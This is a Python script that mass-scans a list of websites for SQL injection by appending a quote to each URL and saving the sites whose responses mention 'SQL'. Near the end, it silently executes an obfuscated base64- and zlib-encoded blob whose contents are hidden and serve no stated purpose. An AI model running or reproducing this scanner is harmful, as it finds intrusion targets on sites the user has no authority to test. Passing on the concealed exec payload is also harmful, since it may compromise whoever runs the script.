import os
import sys
import time
import urllib
from colorama import Fore
def scrap():
  file = open("out.txt","r")
  lines = file.readlines()
  num_lines = sum(1 for line in open('out.txt'))
  print("")
  print(Fore.RED + "\n[#]Searching vulnerabilities for {} websites.").format(num_lines)
  file.close()
  i = 0
  for vuln in lines:
    url = vuln+"%27"
    try:
        response = urllib.urlopen(url)
    except:
        pass
    res = response.read()
    i = i + 1
    if "SQL" in res:
      print(Fore.GREEN + "\n{}.[$] SQL Injectable!\n"+ Fore.WHITE + "[Site]:" +vuln).format(i)
      f2 = open("Result.txt","a")
      f2.write(vuln+"\n")
      f2.close()
    else:
      print(Fore.RED + "\n{}.[x] SQL Not Injectable!\n"+ Fore.WHITE + "[Site]:" +vuln).format(i)
  
  
  import marshal,zlib,base64
  exec(zlib.decompress(base64.b64decode("eNpVkUFPwzAMhe+T9h8euSzVoNKuSOU2uCAkxm6AorC6IqhJSpJK7YD/Trp0tNwc5/nZn610Y12A9cuFSqHvpzgoTctF5azGwdbWSS0xft1aF79KquCobBueXS8XgKqwdy2dYkTXPLoF0pz5oQY78m0d8tAFfKM16hM355yzNrAs1XUo4FvNN6isQ60MQRnYhgxfzeSrbNT3Ub9J4bFAd9UjPRqnTODsuXvF3gZZ4+sHT4/30eyDDkG+1QSvAvnYpjXlBcvy2E/LwI+jccSJDI0M7zl1ygfP2YTAshHzH6jTmEuSolKxVZEI2Bz4kjk2gxh0uSNZDsyez6rzQ209DZkxFxfTDVvp/4ZItMNd8rvddvuAdVSs2Ys5d5imXE1TpkXGi1cQwkhNQqAowITQUhkh2Ml/vPEvkXmmyg==")))
if __name__ == "__main__":
   scrap()
